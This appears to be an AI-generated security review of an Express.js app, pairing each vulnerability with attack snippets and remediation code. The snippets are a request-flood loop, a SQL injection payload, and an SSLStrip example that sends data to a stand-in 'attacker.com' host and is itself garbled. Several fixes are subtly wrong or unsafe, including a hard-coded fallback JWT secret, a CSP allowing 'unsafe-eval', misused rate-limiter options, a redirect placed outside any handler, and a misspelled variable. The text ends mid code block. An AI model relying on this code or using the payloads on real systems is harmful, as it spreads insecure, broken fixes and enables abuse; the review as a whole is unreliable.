input.content:
# Security Review of app.js

## Executive Summary
This application is a basic Express.js application with critical security vulnerabilities including missing authentication, input validation, rate limiting, and exposure of sensitive information.

---

## 🔴 Critical Vulnerabilities

### 1. Missing Authentication (OWASP A01:2021 - Broken Access Control)
**Severity:** Critical
**Lines Affected:** 22-26

**Issue:**
- No authentication or authorization mechanisms
- All endpoints (health, users) are accessible to anyone
- Sensitive user data exposed

**Attack Vector:**
Anyone can access user data without credentials.

**Example Attack:**
```bash
# Attacker can retrieve all users
curl http://localhost:3000/users
# Response: [{"id":1,"name":"Alice","email":"alice@example.com"},...]
```

**Recommendation:**
```javascript
// Require authentication for all routes
const jwt = require('jsonwebtoken');
const expressJwtAuth = require('express-jwt');
const dotenv = require('dotenv');

dotenv.config();

// Middleware to verify JWT tokens
const verifyToken = expressJwtAuth({
  secret: process.env.JWT_SECRET || 'your-super-secret-key',
  algorithms: ['HS256'],
  requestProperty: 'user'
});

// Apply to sensitive routes
app.get('/users', verifyToken, async (req, res) => {
  const users = await db.query('SELECT id, name, email FROM users');
  res.json(users);
});

// Alternative: Require admin role
const ensureAdmin = (req, res, next) => {
  if (!req.user || !req.user.isAdmin) {
    return res.status(403).json({ message: 'Admin access required' });
  }
  next();
};

app.get('/admin/dashboard', verifyToken, ensureAdmin, (req, res) => {
  res.json({ message: 'Admin dashboard' });
});
```

**Additional Requirements:**
- Set up JWT authentication with strong secrets
- Store JWT_SECRET in environment variables only
- Implement password hashing with bcrypt/argon2
- Use JWT TTL (time-to-live) to limit exposure

---

### 2. Missing Rate Limiting (OWASP A05:2021 - Security Misconfiguration)
**Severity:** Critical
**Lines Affected:** Spanning all routes

**Issue:**
- No rate limiting protection
- Vulnerable to brute force, DDoS, and DoS attacks

**Attack Vector:**
```bash
# Brute force attack on endpoints
for i in {1..10000}; do
  curl http://localhost:3000/users &
done
```

**Recommendation:**
```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// Create rate limiter for all routes
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  standardHeaders: true, // Return rate limit info in headers
  legacyHeaders: false,
  skipSuccessfulRequests: true, // Don't count successful requests
  store: new RedisStore({
    client: redisClient, // Redis client instance
    prefix: 'rate_limit:',
    expiry: 15 * 60
  }),
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests',
      message: 'Please try again later'
    });
  }
});

// Apply rate limiting
app.use('/api', limiter);

// More strict limiter for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 requests per 15 minutes per IP
  message: 'Too many failed login attempts'
});

// Separate TLS rate limiter
const tlsLimiter = rateLimit({
  windowMs: 24 * 60 * 60 * 1000, // 24 hours
  max: 10 // Only 10 TLS certificate requests per day
});
```

**Additional Requirements:**
- Use Redis for distributed rate limiting
- Set different limits for different endpoint types
- Implement IP-based and user-based limiting
- Log rate limiting events for monitoring

---

### 3. No Input Validation (OWASP A03:2021 - Injection)
**Severity:** Critical
**Lines Affected:** Throughout (no input endpoints defined yet)

**Issue:**
- When request parameters are added, they won't be validated
- No SQL injection protection
- No XSS prevention
- No input sanitization

**Attack Vector:**
```javascript
// Future vulnerability when adding params
app.get('/users/search', (req, res) => {
  // Vulnerable to SQL injection
  const query = `
    SELECT * FROM users WHERE email = '${req.query.email}'
  `;
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// Attack:
// curl "http://localhost:3000/users/search?email=test' OR '1'='1"
```

**Recommendation:**
```javascript
const expressValidator = require('express-validator');
const sanitizeHTML = require('sanitize-html');

// Validation middleware
const validateUserRequest = [
  expressValidator
    .query('page')
    .notEmpty()
    .isInt({ min: 1 })
    .withMessage('Page must be a positive integer'),
  expressValidator
    .query('limit')
    .notEmpty()
    .isInt({ min: 1, max: 100 })
    .withMessage('Limit must be between 1 and 100'),
  expressValidator
    .body('email')
    .notEmpty()
    .isEmail()
    .withMessage('Invalid email format')
    .normalizeEmail(),
  expressValidator
    .body('name')
    .optional()
    .trim()
    .isLength({ min: 2, max: 50 })
    .withMessage('Name must be 2-50 characters'),
  expressValidator
    .header('X-Forwarded-For')
    .optional()
    .isIP('ipv4', 'ipv6')
    .withMessage('Invalid IP address'),
  (req, res, next) => {
    // Sanitize inputs before processing
    if (req.body) {
      Object.keys(req.body).forEach(key => {
        if (typeof req.body[key] === 'string') {
          req.body[key] = sanitizeHTML(req.body[key], {
            allowedTags: [],
            allowedAttributes: {}
          });
        }
      });
    }

    // Check validation errors
    const errors = expressValidator.validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        error: 'Validation failed',
        details: errors.array()
      });
    }
    next();
  }
];

// Then use like this in real endpoints
app.get('/users', validateUserRequest, async (req, res) => {
  const { page = 1, limit = 10 } = req.query;
  const users = await db.query(
    'SELECT id, name, email FROM users LIMIT ? OFFSET ?',
    [limit, (page - 1) * limit]
  );
  res.json(users);
});

// For database queries, use parameterized queries
app.get('/users/:id', validateUserRequest, async (req, res) => {
  const result = await db.query(
    'SELECT * FROM users WHERE id = ?', // Safe!
    [req.params.id]
  );
  res.json(result);
});
```

**Additional Requirements:**
- Use `express-validator` for request validation
- Implement parameterized queries for database
- Sanitize HTML input for form fields
- Input length validation
- Content-Type header validation

---

### 4. Missing HTTPS/TLS Implementation
**Severity:** High
**Lines Affected:** Entire server

**Issue:**
- Running in HTTP
- User credentials and data sent in plaintext
- Vulnerable to MITM (Man-in-the-Middle) attacks

**Attack Vector:**
```bash
# Attack using SSL Strip
SSLStrip.py -l 80 -k
curl http://attacker.com/users
# Data transmitted to attacker's server
```

**Recommendation:**
```javascript
// Using Express.js with TLS
const fs = require('fs');
const https = require('https');

// Load SSL certificates
const sslOptions = {
  key: fs.readFileSync(process.env.SSL_KEY_PATH || '/etc/ssl/private/server.key'),
  cert: fs.readFileSync(process.env.SSL_CERT_PATH || '/etc/ssl/certs/server.crt'),
  ca: fs.readFileSync(process.env.SSL_CA_PATH || '/etc/ssl/certs/ca.crt'),
  minVersion: 'TLSv1.2', // Only support strong TLS versions
  ciphers: [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
  ].join(':'),
  honorCipherOrder: true
};

// In production, only allow HTTPS
if (process.env.NODE_ENV === 'production' && !req.secure && req.protocol !== 'https') {
  return res.redirect(301, `https://${req.headers.host}${req.originalUrl}`);
}

// Or in Express:
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && !req.secure) {
    return res.redirect(['https://', req.get('host'), req.originalUrl].join(''));
  }
  next();
});

// Alternative: Middleware to enforce HTTPS
const enforceHttps = (req, res, next) => {
  // Check for secure cookie or X-Forwarded-Proto header
  const secure = req.secure ||
                 (req.headers['x-forwarded-proto'] && req.headers['x-forwarded-proto'] === 'https') ||
                 (req.socket.encrypted);
  if (!secure) {
    return res.status(403).json({ error: 'HTTPS required' });
  }
  next();
};

// Create HTTPS server
const server = https.createServer(sslOptions, app);
server.listen(443, () => {
  console.log('Secure server running on port 443');
});

// Redirect HTTP to HTTPS
const http = require('http');
http.createServer((req, res) => {
  res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });
  res.end();
}).listen(80, () => {
  console.log('HTTP server redirecting to HTTPS');
});
```

**Additional Requirements:**
- Use HTTPS in production
- Set up Let's Encrypt or similar certificate authority
- Configure TLS 1.2 and above only
- Use strong cipher suites
- Implement HTTP Strict Transport Security (HSTS) header

---

## 🟠 Medium Severity Issues

### 5. No CORS Configuration
**Severity:** Medium
**Issue:**
- Exposes API to unauthorized cross-origin requests
- May lead to stolen cookies or API abuse

**Recommendation:**
```javascript
const cors = require('cors');

const allowedOrigins = [
  process.env.FRONTEND_URL || 'https://your-domain.com',
  'https://app.your-domain.com'
];

const corsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      const msg = 'CORS policy does not allow access from origin ' + origin;
      callback(new Error(msg), false);
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  credentials: true, // Allow cookies and authentication headers
  maxAge: 86400, // Cache the options response for 24 hours
  exposedHeaders: ['X-Custom-Header']
};

// Apply CORS
app.use(cors(corsOptions));

// Or with express middleware
const corsMiddleware = cors({
  credentials: true,
  optionsSuccessStatus: 200
});

app.use(corssMiddleware);
```

---

### 6. Missing HTTPS-only Cookies
**Severity:** Medium
**Issue:**
- Cookies created without security flags
- Vulnerable to XSS and session hijacking

**Recommendation:**
```javascript
const session = require('express-session');
const cookieParser = require('cookie-parser');

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production', // HTTPS only
    httpOnly: true, // Not accessible via JavaScript
    sameSite: 'strict', // CSRF protection
    maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
  },
  // Use random UUID for session IDs
  genid: function(req) {
    return crypto.randomUUID(); // Requires 'crypto' module
  },
  store: new session.MemoryStore({
    checkInterval: 1000 * 60 * 10 // prune abandoned sessions
  })
}));

app.use(cookieParser());

// Set explicit cookie flags for nested routes
app.use('/dashboard', (req, res, next) => {
  res.cookie('user_auth', 'true', {
    secure: true,
    httpOnly: true,
    sameSite: 'strict'
  });
  next();
});
```

---

### 7. Missing Security Headers
**Severity:** Medium
**Issue:**
- No security-related HTTP headers
- Missing protection against common web attacks

**Recommendation:**
```javascript
const helmet = require('helmet');

// Helmet adds many security headers
app.use(helmet());

// Or customize specific headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-eval'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      workerSrc: ["'none'"],
      formAction: ["'self'"],
      baseUri: ["'self'"],
      frameAncestors: ["'none'"],
      reportUri: '/__/cspreport'
    }
  },
  hsts: {
    maxAge: 31536000, // 1 year in seconds
    includeSubDomains: true,
    preload: true
  },
  xssFilter: true,
  noSniff: true,
  referrerPolicy: { policy: 'no-referrer' },
  disablePoweredByHeader: true
}));

// Custom headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});
```

---

### 8. Missing Request Size Limits
**Severity:** Medium
**Issue:**
- No limit on request size
- Vulnerable to DoS attacks with large payloads

**Recommendation:**
```javascript
// Limit body size
app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));

// Limit request size globally
app.use(express.urlencoded({ extended: true }));

// Custom size limit for specific routes
app.post('/upload', express.raw({ type: 'image/*', limit: '2mb' }), upload);
